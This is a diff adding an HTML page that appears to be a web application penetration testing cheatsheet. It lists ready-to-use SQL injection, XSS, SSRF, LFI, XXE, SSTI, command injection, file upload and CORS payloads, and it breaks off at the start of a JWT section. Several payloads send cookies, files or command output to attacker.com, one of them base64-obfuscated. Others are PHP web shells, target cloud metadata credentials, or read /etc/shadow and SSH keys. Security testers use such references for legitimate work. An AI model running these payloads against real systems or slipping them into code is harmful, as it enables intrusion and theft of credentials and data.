@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Application Testing Cheatsheet | maeitsec</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #12121a;
+            --bg-tertiary: #1a1a24;
+            --accent: #00ff88;
+            --accent-dim: #00cc6a;
+            --accent-glow: rgba(0, 255, 136, 0.15);
+            --text-primary: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --red: #ff4757;
+            --yellow: #ffa502;
+            --blue: #3b82f6;
+            --purple: #a855f7;
+            --orange: #f97316;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        
+        /* Navigation */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            padding: 1rem 2rem;
+            background: rgba(10, 10, 15, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+        .logo span { color: var(--text-primary); }
+        .back-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+        .back-link:hover { color: var(--accent); }
+        
+        /* Main Layout */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 5rem 2rem 3rem;
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: 3rem;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            position: sticky;
+            top: 5rem;
+            height: fit-content;
+            max-height: calc(100vh - 6rem);
+            overflow-y: auto;
+        }
+        .sidebar-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+        .sidebar-nav { list-style: none; }
+        .sidebar-nav li { margin-bottom: 0.25rem; }
+        .sidebar-nav a {
+            display: block;
+            padding: 0.5rem 1rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            border-left: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .sidebar-nav a:hover {
+            color: var(--accent);
+            border-left-color: var(--accent);
+            background: var(--accent-glow);
+        }
+        
+        /* Content */
+        .content { min-width: 0; }
+        .page-header {
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        .page-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .page-header h1 .icon { margin-right: 0.75rem; }
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+        
+        /* Section */
+        .section {
+            margin-bottom: 3rem;
+            scroll-margin-top: 5rem;
+        }
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--accent);
+        }
+        .section-title::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+        
+        /* Code Block */
+        .code-block {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+        }
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 1rem;
+            background: var(--bg-tertiary);
+            border-bottom: 1px solid var(--border);
+        }
+        .code-title {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+        .code-tag {
+            font-size: 0.7rem;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .tag-sqli { background: rgba(255, 71, 87, 0.2); color: var(--red); }
+        .tag-xss { background: rgba(255, 165, 2, 0.2); color: var(--yellow); }
+        .tag-ssrf { background: rgba(59, 130, 246, 0.2); color: var(--blue); }
+        .tag-lfi { background: rgba(168, 85, 247, 0.2); color: var(--purple); }
+        .tag-auth { background: rgba(249, 115, 22, 0.2); color: var(--orange); }
+        .tag-cmd { background: rgba(0, 255, 136, 0.2); color: var(--accent); }
+        .code-content {
+            padding: 1rem;
+            overflow-x: auto;
+        }
+        .code-content pre {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            line-height: 1.6;
+            color: var(--text-primary);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .code-content .comment { color: var(--text-muted); }
+        .code-content .string { color: var(--accent); }
+        .code-content .keyword { color: var(--purple); }
+        .copy-btn {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 0.3rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .copy-btn:hover {
+            background: var(--accent);
+            color: var(--bg-primary);
+            border-color: var(--accent);
+        }
+        
+        /* Info Box */
+        .info-box {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 8px;
+            padding: 1rem 1.25rem;
+            margin-bottom: 1.5rem;
+        }
+        .info-box.warning { border-left-color: var(--yellow); }
+        .info-box.danger { border-left-color: var(--red); }
+        .info-box-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .info-box p { color: var(--text-secondary); font-size: 0.95rem; }
+        
+        /* Table */
+        .table-wrapper {
+            overflow-x: auto;
+            margin-bottom: 1.5rem;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+        }
+        th, td {
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border: 1px solid var(--border);
+        }
+        th {
+            background: var(--bg-tertiary);
+            font-weight: 600;
+            color: var(--accent);
+        }
+        td { background: var(--bg-secondary); }
+        td code {
+            background: var(--bg-tertiary);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+        
+        /* Mobile */
+        @media (max-width: 900px) {
+            .container {
+                grid-template-columns: 1fr;
+                padding-top: 4rem;
+            }
+            .sidebar { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="../index.html" class="logo">&lt;<span>maeitsec</span>/&gt;</a>
+        <a href="../index.html#cheatsheets" class="back-link">← Back to Cheatsheets</a>
+    </nav>
+
+    <div class="container">
+        <aside class="sidebar">
+            <div class="sidebar-title">On This Page</div>
+            <ul class="sidebar-nav">
+                <li><a href="#recon">Reconnaissance</a></li>
+                <li><a href="#sqli">SQL Injection</a></li>
+                <li><a href="#xss">Cross-Site Scripting</a></li>
+                <li><a href="#ssrf">SSRF</a></li>
+                <li><a href="#lfi">LFI/RFI</a></li>
+                <li><a href="#auth">Authentication</a></li>
+                <li><a href="#idor">IDOR</a></li>
+                <li><a href="#xxe">XXE</a></li>
+                <li><a href="#ssti">SSTI</a></li>
+                <li><a href="#cmdi">Command Injection</a></li>
+                <li><a href="#upload">File Upload</a></li>
+                <li><a href="#cors">CORS</a></li>
+                <li><a href="#jwt">JWT Attacks</a></li>
+                <li><a href="#deserialization">Deserialization</a></li>
+                <li><a href="#wordlists">Wordlists</a></li>
+            </ul>
+        </aside>
+
+        <main class="content">
+            <header class="page-header">
+                <h1><span class="icon">🌐</span>Web Application Testing</h1>
+                <p>Comprehensive cheatsheet for web application penetration testing covering OWASP Top 10 and beyond.</p>
+            </header>
+
+            <!-- Reconnaissance -->
+            <section id="recon" class="section">
+                <h2 class="section-title">🔍 Reconnaissance</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Directory & File Enumeration</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Gobuster</span>
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak
+
+<span class="comment"># Feroxbuster (recursive)</span>
+feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html -d 2
+
+<span class="comment"># ffuf</span>
+ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
+
+<span class="comment"># dirsearch</span>
+dirsearch -u https://target.com -e php,html,js -t 50</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Subdomain Enumeration</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Subfinder</span>
+subfinder -d target.com -all -o subdomains.txt
+
+<span class="comment"># Amass</span>
+amass enum -passive -d target.com -o amass.txt
+
+<span class="comment"># DNS Bruteforce with ffuf</span>
+ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
+
+<span class="comment"># Httpx - probe for live hosts</span>
+cat subdomains.txt | httpx -ports 80,443,8080,8443 -o live.txt</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Technology Fingerprinting</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Wappalyzer (browser extension) or CLI</span>
+wappalyzer https://target.com
+
+<span class="comment"># WhatWeb</span>
+whatweb -v https://target.com
+
+<span class="comment"># Nuclei - technology detection</span>
+nuclei -u https://target.com -t technologies/
+
+<span class="comment"># Check headers</span>
+curl -I https://target.com</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SQL Injection -->
+            <section id="sqli" class="section">
+                <h2 class="section-title">💉 SQL Injection</h2>
+                
+                <div class="info-box danger">
+                    <div class="info-box-title">⚠️ Always Test Responsibly</div>
+                    <p>Only test on systems you have explicit authorization to test.</p>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Basic Detection Payloads</span>
+                        <span class="code-tag tag-sqli">SQLi</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># String-based</span>
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+') OR ('1'='1
+
+<span class="comment"># Numeric-based</span>
+1 OR 1=1
+1' OR '1'='1
+1" OR "1"="1
+
+<span class="comment"># Time-based blind</span>
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' || pg_sleep(5)--
+
+<span class="comment"># Error-based</span>
+' AND 1=CONVERT(int, @@version)--
+' AND extractvalue(1, concat(0x7e, version()))--</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">UNION-Based SQLi</span>
+                        <span class="code-tag tag-sqli">SQLi</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Find number of columns</span>
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  <span class="comment"># Keep incrementing until error</span>
+
+<span class="comment"># Or use NULL method</span>
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+<span class="comment"># Extract data (example with 3 columns)</span>
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">SQLMap Commands</span>
+                        <span class="code-tag tag-sqli">SQLi</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Basic scan</span>
+sqlmap -u "https://target.com/page?id=1" --batch
+
+<span class="comment"># With cookie/session</span>
+sqlmap -u "https://target.com/page?id=1" --cookie="PHPSESSID=abc123" --batch
+
+<span class="comment"># POST request</span>
+sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch
+
+<span class="comment"># From Burp request file</span>
+sqlmap -r request.txt --batch
+
+<span class="comment"># Database enumeration</span>
+sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" -D dbname --tables
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
+
+<span class="comment"># OS Shell / SQL Shell</span>
+sqlmap -u "https://target.com/page?id=1" --os-shell
+sqlmap -u "https://target.com/page?id=1" --sql-shell
+
+<span class="comment"># Bypass WAF</span>
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between --random-agent</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- XSS -->
+            <section id="xss" class="section">
+                <h2 class="section-title">⚡ Cross-Site Scripting (XSS)</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Basic XSS Payloads</span>
+                        <span class="code-tag tag-xss">XSS</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Basic</span>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+<span class="comment"># IMG tag</span>
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;img src=x onerror=alert(document.domain)&gt;
+
+<span class="comment"># SVG</span>
+&lt;svg onload=alert('XSS')&gt;
+&lt;svg/onload=alert('XSS')&gt;
+
+<span class="comment"># Event handlers</span>
+&lt;body onload=alert('XSS')&gt;
+&lt;input onfocus=alert('XSS') autofocus&gt;
+&lt;marquee onstart=alert('XSS')&gt;
+&lt;div onmouseover=alert('XSS')&gt;hover me&lt;/div&gt;
+
+<span class="comment"># JavaScript URI</span>
+&lt;a href="javascript:alert('XSS')"&gt;click&lt;/a&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Filter Bypass Techniques</span>
+                        <span class="code-tag tag-xss">XSS</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Case variation</span>
+&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;
+&lt;IMG SRC=x OnErRoR=alert('XSS')&gt;
+
+<span class="comment"># Null bytes</span>
+&lt;scr%00ipt&gt;alert('XSS')&lt;/scr%00ipt&gt;
+
+<span class="comment"># HTML encoding</span>
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;
+
+<span class="comment"># Double encoding</span>
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+<span class="comment"># Without parentheses</span>
+&lt;script&gt;alert`XSS`&lt;/script&gt;
+&lt;img src=x onerror=alert`XSS`&gt;
+
+<span class="comment"># Without spaces</span>
+&lt;svg/onload=alert('XSS')&gt;
+
+<span class="comment"># Breaking out of attributes</span>
+" onfocus=alert('XSS') autofocus="
+' onfocus=alert('XSS') autofocus='</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Cookie Stealing Payload</span>
+                        <span class="code-tag tag-xss">XSS</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Basic cookie stealer</span>
+&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+<span class="comment"># Using fetch</span>
+&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+
+<span class="comment"># Using Image</span>
+&lt;script&gt;new Image().src='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+<span class="comment"># Base64 encoded</span>
+&lt;script&gt;eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Iitkb2N1bWVudC5jb29raWU='))&lt;/script&gt;</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SSRF -->
+            <section id="ssrf" class="section">
+                <h2 class="section-title">🔗 Server-Side Request Forgery (SSRF)</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Basic SSRF Payloads</span>
+                        <span class="code-tag tag-ssrf">SSRF</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Localhost variations</span>
+http://127.0.0.1
+http://localhost
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://127.1
+http://0.0.0.0
+http://0
+http://[::1]
+http://[0:0:0:0:0:0:0:1]
+
+<span class="comment"># AWS metadata (IMDSv1)</span>
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+
+<span class="comment"># AWS metadata (IMDSv2)</span>
+<span class="comment"># First get token:</span>
+curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+<span class="comment"># Then use token:</span>
+curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/
+
+<span class="comment"># GCP metadata</span>
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+
+<span class="comment"># Azure metadata</span>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">SSRF Bypass Techniques</span>
+                        <span class="code-tag tag-ssrf">SSRF</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># URL encoding</span>
+http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
+
+<span class="comment"># Decimal IP</span>
+http://2130706433 (127.0.0.1)
+
+<span class="comment"># Hex IP</span>
+http://0x7f000001
+
+<span class="comment"># Octal IP</span>
+http://0177.0.0.1
+
+<span class="comment"># DNS rebinding</span>
+http://spoofed.burpcollaborator.net
+
+<span class="comment"># Redirect bypass</span>
+http://attacker.com/redirect?url=http://127.0.0.1
+
+<span class="comment"># Using @ symbol</span>
+http://attacker.com@127.0.0.1
+http://127.0.0.1#@attacker.com
+
+<span class="comment"># Protocol smuggling</span>
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+dict://127.0.0.1:6379/info</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- LFI/RFI -->
+            <section id="lfi" class="section">
+                <h2 class="section-title">📁 Local/Remote File Inclusion</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">LFI Payloads</span>
+                        <span class="code-tag tag-lfi">LFI</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Basic traversal</span>
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+
+<span class="comment"># Null byte (PHP &lt; 5.3.4)</span>
+../../../etc/passwd%00
+../../../etc/passwd%00.php
+
+<span class="comment"># Double encoding</span>
+%252e%252e%252f%252e%252e%252fetc/passwd
+
+<span class="comment"># Windows paths</span>
+..\..\..\windows\system32\drivers\etc\hosts
+..%5c..%5c..%5cwindows/system32/drivers/etc/hosts
+
+<span class="comment"># Interesting Linux files</span>
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+~/.bash_history
+~/.ssh/id_rsa
+
+<span class="comment"># PHP wrappers</span>
+php://filter/convert.base64-encode/resource=index.php
+php://input (POST: &lt;?php system($_GET['cmd']); ?&gt;)
+data://text/plain,&lt;?php system($_GET['cmd']); ?&gt;
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Authentication -->
+            <section id="auth" class="section">
+                <h2 class="section-title">🔐 Authentication Bypass</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Common Auth Bypass Techniques</span>
+                        <span class="code-tag tag-auth">Auth</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Default credentials</span>
+admin:admin
+admin:password
+admin:123456
+root:root
+test:test
+
+<span class="comment"># SQL Injection in login</span>
+admin' --
+admin' #
+' OR '1'='1' --
+' OR '1'='1' #
+admin'/*
+') OR ('1'='1
+
+<span class="comment"># Response manipulation</span>
+Change "success":false to "success":true
+Change "authenticated":0 to "authenticated":1
+
+<span class="comment"># Parameter pollution</span>
+?username=admin&username=attacker (HPP)
+
+<span class="comment"># Mass assignment</span>
+{"username":"user","password":"pass","isAdmin":true}
+{"username":"user","password":"pass","role":"admin"}</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Password Reset Vulnerabilities</span>
+                        <span class="code-tag tag-auth">Auth</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Host header injection</span>
+Host: attacker.com
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+<span class="comment"># Token manipulation</span>
+<span class="comment"># Weak tokens: sequential, timestamp-based, predictable</span>
+<span class="comment"># Try: token reuse, token for user A on user B</span>
+
+<span class="comment"># Parameter tampering</span>
+email=victim@target.com&email=attacker@evil.com
+email=victim@target.com%0a%0dcc:attacker@evil.com
+
+<span class="comment"># IDOR in reset</span>
+/reset?token=abc123&user_id=1 → change user_id</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- IDOR -->
+            <section id="idor" class="section">
+                <h2 class="section-title">🎯 Insecure Direct Object Reference</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">IDOR Testing</span>
+                        <span class="code-tag tag-auth">IDOR</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Numeric IDs</span>
+/api/user/1 → /api/user/2
+/invoice/1001 → /invoice/1002
+/order?id=100 → /order?id=101
+
+<span class="comment"># UUID/GUID</span>
+<span class="comment"># Try: leaked UUIDs in responses, predictable patterns</span>
+
+<span class="comment"># Encoded values</span>
+/user/dXNlcjE= (base64: user1) → /user/dXNlcjI= (user2)
+
+<span class="comment"># Parameter pollution</span>
+/api/user?id=1&id=2
+
+<span class="comment"># HTTP method change</span>
+GET /api/user/1 → POST/PUT/DELETE /api/user/2
+
+<span class="comment"># Wrapped IDs in JSON</span>
+{"user_id": 1} → {"user_id": 2}
+{"user": {"id": 1}} → {"user": {"id": 2}}</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- XXE -->
+            <section id="xxe" class="section">
+                <h2 class="section-title">📄 XML External Entity (XXE)</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">XXE Payloads</span>
+                        <span class="code-tag tag-cmd">XXE</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Basic XXE to read files</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+<span class="comment"># XXE via parameter entity (blind)</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %xxe;
+]&gt;
+
+<span class="comment"># evil.dtd on attacker server:</span>
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'&gt;"&gt;
+%eval;
+%exfil;
+
+<span class="comment"># XXE to SSRF</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+<span class="comment"># XInclude (when you don't control DOCTYPE)</span>
+&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SSTI -->
+            <section id="ssti" class="section">
+                <h2 class="section-title">🧩 Server-Side Template Injection</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">SSTI Detection & Exploitation</span>
+                        <span class="code-tag tag-cmd">SSTI</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Detection payloads</span>
+{{7*7}}
+${7*7}
+&lt;%= 7*7 %&gt;
+${{7*7}}
+#{7*7}
+*{7*7}
+
+<span class="comment"># Jinja2 (Python)</span>
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
+
+<span class="comment"># Twig (PHP)</span>
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+<span class="comment"># Freemarker (Java)</span>
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }
+
+<span class="comment"># Velocity (Java)</span>
+#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+
+<span class="comment"># Smarty (PHP)</span>
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())}</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Command Injection -->
+            <section id="cmdi" class="section">
+                <h2 class="section-title">💻 Command Injection</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">OS Command Injection Payloads</span>
+                        <span class="code-tag tag-cmd">CMDi</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Command separators</span>
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+
+<span class="comment"># Newline</span>
+%0a id
+%0d%0a id
+
+<span class="comment"># Blind detection (time-based)</span>
+; sleep 5
+| sleep 5
+& ping -c 5 127.0.0.1
+
+<span class="comment"># Blind detection (out-of-band)</span>
+; curl http://attacker.com/$(whoami)
+; nslookup $(whoami).attacker.com
+| wget http://attacker.com/$(id|base64)
+
+<span class="comment"># Windows</span>
+& whoami
+| whoami
+&& whoami
+|| whoami
+; whoami
+%0a whoami</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- File Upload -->
+            <section id="upload" class="section">
+                <h2 class="section-title">📤 File Upload Bypass</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">File Upload Techniques</span>
+                        <span class="code-tag tag-auth">Upload</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Extension bypass</span>
+shell.php → shell.php5, shell.phtml, shell.phar
+shell.php → shell.php.jpg, shell.php%00.jpg
+shell.php → shell.PHP, shell.pHp
+
+<span class="comment"># Content-Type bypass</span>
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif
+
+<span class="comment"># Magic bytes</span>
+GIF89a;&lt;?php system($_GET['cmd']); ?&gt;
+(Add GIF header to PHP file)
+
+<span class="comment"># Double extension</span>
+shell.php.jpg (if server processes .php)
+shell.jpg.php (if only checking first extension)
+
+<span class="comment"># Null byte (old servers)</span>
+shell.php%00.jpg
+shell.php\x00.jpg
+
+<span class="comment"># Case sensitivity</span>
+shell.PhP
+shell.pHP
+
+<span class="comment"># .htaccess upload (Apache)</span>
+AddType application/x-httpd-php .jpg</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- CORS -->
+            <section id="cors" class="section">
+                <h2 class="section-title">🌍 CORS Misconfiguration</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">CORS Testing</span>
+                        <span class="code-tag tag-ssrf">CORS</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Test with curl</span>
+curl -H "Origin: https://evil.com" -I https://target.com/api/sensitive
+
+<span class="comment"># Check for:</span>
+Access-Control-Allow-Origin: https://evil.com  <span class="comment"># Reflects origin = vulnerable</span>
+Access-Control-Allow-Origin: *  <span class="comment"># Wildcard = check if credentials allowed</span>
+Access-Control-Allow-Credentials: true  <span class="comment"># With reflected origin = critical</span>
+
+<span class="comment"># Exploitation (attacker's page)</span>
+&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = function() {
+    location='https://attacker.com/log?data='+encodeURIComponent(this.responseText);
+};
+req.open('GET','https://target.com/api/sensitive',true);
+req.withCredentials = true;
+req.send();
+&lt;/script&gt;</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- JWT -->
+            <section id="jwt" class="section">
+                <h2 class="section-title">🎫 JWT Attacks</h2>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">JWT Vulnerabilities</span>
+                        <span class="code-tag tag-auth">JWT</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># None algorithm</span>
